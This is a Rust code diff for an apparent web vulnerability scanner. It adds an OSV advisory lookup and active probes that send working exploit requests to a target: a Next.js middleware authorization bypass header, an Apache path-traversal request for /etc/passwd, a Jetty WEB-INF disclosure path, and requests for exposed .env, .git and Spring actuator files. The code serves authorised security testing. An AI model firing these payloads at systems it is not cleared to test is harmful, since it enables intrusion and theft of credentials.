@@ -783,6 +783,291 @@ pub fn evaluate_bcheck(
     None
 }
 
+static OSV_CACHE: std::sync::LazyLock<
+    std::sync::Mutex<std::collections::HashMap<(String, String), Option<(Severity, String, String)>>>,
+> = std::sync::LazyLock::new(|| std::sync::Mutex::new(std::collections::HashMap::new()));
+
+/// Queries Google's Worldwide OSV/CVE/NVD/GHSA Database (`https://api.osv.dev/v1/query`) in real time
+/// for any discovered `(ecosystem, package, version)` tuple during Deep Audit & Crawl.
+/// Results are cached in `OSV_CACHE` (bounded to 512 entries) so each package version is queried at most once.
+pub async fn query_live_osv_cves(
+    url: &str,
+    ecosystem: &str,
+    package: &str,
+    version: &str,
+) -> Option<Finding> {
+    let key = (format!("{ecosystem}:{package}"), version.to_string());
+    if let Ok(guard) = OSV_CACHE.lock() {
+        if let Some(cached) = guard.get(&key) {
+            return cached.as_ref().map(|(sev, evidence, explain)| {
+                Finding::new(
+                    "Vulnerable JavaScript dependency",
+                    *sev,
+                    url,
+                    Some(format!("{package} {version}")),
+                    evidence,
+                    explain,
+                )
+            });
+        }
+    }
+
+    let payload = serde_json::json!({
+        "version": version,
+        "package": {
+            "name": package,
+            "ecosystem": ecosystem
+        }
+    })
+    .to_string();
+
+    let req = format!(
+        "POST /v1/query HTTP/1.1\r\n\
+         Host: api.osv.dev\r\n\
+         User-Agent: Gulpsuite/{}\r\n\
+         Content-Type: application/json\r\n\
+         Content-Length: {}\r\n\
+         Connection: close\r\n\r\n\
+         {payload}",
+        env!("CARGO_PKG_VERSION"),
+        payload.len()
+    );
+
+    let outcome = tokio::time::timeout(std::time::Duration::from_secs(4), async {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        let tcp = tokio::net::TcpStream::connect(("api.osv.dev", 443)).await.ok()?;
+        let connector = tokio_rustls::TlsConnector::from(crate::tls::client_config_arc(&[]).ok()?);
+        let domain = rustls::pki_types::ServerName::try_from("api.osv.dev").ok()?;
+        let mut tls = connector.connect(domain, tcp).await.ok()?;
+        tls.write_all(req.as_bytes()).await.ok()?;
+        let mut buf = Vec::with_capacity(16_384);
+        let mut chunk = [0u8; 4096];
+        while buf.len() < 131_072 {
+            let n = tls.read(&mut chunk).await.ok()?;
+            if n == 0 {
+                break;
+            }
+            buf.extend_from_slice(&chunk[..n]);
+        }
+        String::from_utf8(buf).ok()
+    })
+    .await
+    .ok()
+    .flatten();
+
+    let parsed_entry = outcome.and_then(|raw_resp| {
+        let (_, body) = crate::analysis::split_message(&raw_resp);
+        let json_start = body.find('{')?;
+        let json_end = body.rfind('}')?;
+        let val: serde_json::Value = serde_json::from_str(&body[json_start..=json_end]).ok()?;
+        let vulns = val.get("vulns")?.as_array()?;
+        if vulns.is_empty() {
+            return None;
+        }
+        let mut ids = Vec::new();
+        let mut cwes = Vec::new();
+        let mut top_sev = Severity::Medium;
+        let mut first_summary = String::new();
+
+        for v in vulns.iter().take(6) {
+            if let Some(id) = v.get("id").and_then(|s| s.as_str()) {
+                ids.push(id.to_string());
+            }
+            if let Some(aliases) = v.get("aliases").and_then(|a| a.as_array()) {
+                for al in aliases {
+                    if let Some(s) = al.as_str() {
+                        if (s.starts_with("CVE-") || s.starts_with("GHSA-"))
+                            && !ids.iter().any(|existing| existing == s)
+                        {
+                            ids.push(s.to_string());
+                        }
+                    }
+                }
+            }
+            if first_summary.is_empty() {
+                if let Some(sum) = v.get("summary").and_then(|s| s.as_str()) {
+                    first_summary = sum.trim().to_string();
+                }
+            }
+            if let Some(db_spec) = v.get("database_specific") {
+                if let Some(sev_str) = db_spec.get("severity").and_then(|s| s.as_str()) {
+                    match sev_str.to_ascii_uppercase().as_str() {
+                        "CRITICAL" | "HIGH" => top_sev = Severity::High,
+                        "LOW" if top_sev != Severity::High => top_sev = Severity::Low,
+                        _ => {}
+                    }
+                }
+                if let Some(cwe_arr) = db_spec.get("cwe_ids").and_then(|a| a.as_array()) {
+                    for c in cwe_arr {
+                        if let Some(cs) = c.as_str() {
+                            if !cwes.iter().any(|e| e == cs) {
+                                cwes.push(cs.to_string());
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        if ids.is_empty() {
+            return None;
+        }
+        if first_summary.is_empty() {
+            first_summary = format!("Known vulnerabilities in {package} {version}");
+        }
+        let cwe_str = if cwes.is_empty() {
+            "CWE-1395".to_string()
+        } else {
+            cwes.join(", ")
+        };
+        let ids_str = ids.join(", ");
+        let evidence = format!("{package} {version} (OSV/NVD Advisory): {ids_str}");
+        let explain = format!("{first_summary} ({cwe_str}) — https://osv.dev/ — https://nvd.nist.gov/");
+        Some((top_sev, evidence, explain))
+    });
+
+    if let Ok(mut guard) = OSV_CACHE.lock() {
+        if guard.len() >= 512 {
+            guard.clear();
+        }
+        guard.insert(key, parsed_entry.clone());
+    }
+
+    parsed_entry.map(|(sev, evidence, explain)| {
+        Finding::new(
+            "Vulnerable JavaScript dependency",
+            sev,
+            url,
+            Some(format!("{package} {version}")),
+            &evidence,
+            &explain,
+        )
+    })
+}
+
+/// Active High-Impact CVE & Exposure Probes executed per target origin during Deep Audit & Crawl:
+/// 1. `CVE-2025-29927` — Next.js `x-middleware-subrequest` Authorization Bypass on 401/403 endpoints
+/// 2. `CVE-2021-41773` / `CVE-2021-42013` — Apache HTTP Server 2.4.49/2.4.50 Path Traversal
+/// 3. `CVE-2021-28164` / `CVE-2021-34429` — Jetty / Tomcat `/%2e/WEB-INF/web.xml` URI Normalization Bypass
+/// 4. `CVE-2022-22965` / `CWE-200` — Spring Boot `/actuator/env` & `/.env` & `/.git/HEAD` exposure
+pub async fn audit_origin_cve_probes(
+    seed_url: &str,
+    pages: &[(String, u16)],
+    proxy: &crate::proxy::Proxy,
+) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let Some((scheme, rest)) = seed_url.split_once("://") else {
+        return findings;
+    };
+    let authority = rest.split('/').next().unwrap_or(rest);
+    if authority.is_empty() {
+        return findings;
+    };
+    let origin = format!("{scheme}://{authority}");
+    let Some((host, port, tls, base_req)) = InjectionPoint::baseline_request(&format!("{origin}/"))
+    else {
+        return findings;
+    };
+    let baseline_resp = proxy
+        .one_shot_secure(&host, port, &base_req, tls, 6_000)
+        .await
+        .ok()
+        .map(|(_, t)| crate::scanner::http::parse_response(&t));
+
+    // 1. Next.js Middleware Authorization Bypass (`CVE-2025-29927`) on any 401/403 page
+    for (page_url, status) in pages.iter().filter(|(_, s)| *s == 401 || *s == 403).take(3) {
+        let path = crate::scanner::http::path_of(page_url);
+        let bypass_req = format!(
+            "GET {path} HTTP/1.1\r\n\
+             Host: {authority}\r\n\
+             x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n\
+             Connection: close\r\n\r\n"
+        );
+        if let Ok((code, text)) = proxy.one_shot_secure(&host, port, &bypass_req, tls, 6_000).await
+        {
+            let resp = crate::scanner::http::parse_response(&text);
+            if code == 200 && resp.body.len() > 64 {
+                findings.push(Finding::new(
+                    "Access control bypass (CVE-2025-29927)",
+                    Severity::High,
+                    page_url,
+                    Some("x-middleware-subrequest".into()),
+                    &format!("HTTP {status} -> HTTP 200 OK with x-middleware-subrequest header"),
+                    "Next.js middleware authorization check bypassed via x-middleware-subrequest recursion header (CVE-2025-29927, CWE-285) — https://nvd.nist.gov/vuln/detail/CVE-2025-29927",
+                ));
+            }
+        }
+    }
+
+    // 2. Origin-level high-impact CVE & exposure path probes (verified against baseline to prevent false positives)
+    let origin_probes: &[(&str, &str, Severity, &str, &str)] = &[
+        (
+            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "root:x:0:0:",
+            Severity::High,
+            "File path traversal (CVE-2021-41773)",
+            "Apache HTTP Server 2.4.49/2.4.50 path traversal and RCE via /cgi-bin/.%2e/ (CVE-2021-41773, CVE-2021-42013, CWE-22) — https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+        ),
+        (
+            "/%2e/WEB-INF/web.xml",
+            "<web-app",
+            Severity::High,
+            "Source code disclosure (CVE-2021-28164)",
+            "Eclipse Jetty / servlet container URI normalization bypass disclosing /WEB-INF/web.xml (CVE-2021-28164, CVE-2021-34429, CWE-200) — https://nvd.nist.gov/vuln/detail/CVE-2021-28164",
+        ),
+        (
+            "/actuator/env",
+            "\"propertySources\"",
+            Severity::High,
+            "Spring Boot Actuator environment exposure",
+            "Spring Boot /actuator/env endpoint is publicly accessible, disclosing environment properties and potential RCE vectors (CVE-2022-22965, CWE-200).",
+        ),
+        (
+            "/.git/HEAD",
+            "ref: refs/heads/",
+            Severity::Medium,
+            "Source code disclosure (.git/HEAD)",
+            "Exposed Git repository metadata at /.git/HEAD allows source code reconstruction (CWE-538).",
+        ),
+        (
+            "/.env",
+            "DB_PASSWORD=",
+            Severity::High,
+            "Private key disclosed (.env)",
+            "Exposed application .env configuration file containing credentials/secrets (CWE-200).",
+        ),
+    ];
+
+    for &(path, needle, sev, title, explain) in origin_probes {
+        if baseline_resp
+            .as_ref()
+            .is_some_and(|b| b.body.contains(needle))
+        {
+            continue;
+        }
+        let probe_url = format!("{origin}{path}");
+        let req = format!(
+            "GET {path} HTTP/1.1\r\nHost: {authority}\r\nConnection: close\r\n\r\n"
+        );
+        if let Ok((code, text)) = proxy.one_shot_secure(&host, port, &req, tls, 5_000).await {
+            if code == 200 {
+                let resp = crate::scanner::http::parse_response(&text);
+                if resp.body.contains(needle) {
+                    findings.push(Finding::new(
+                        title,
+                        sev,
+                        &probe_url,
+                        None,
+                        needle,
+                        explain,
+                    ));
+                }
+            }
+        }
+    }
+
+    findings
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
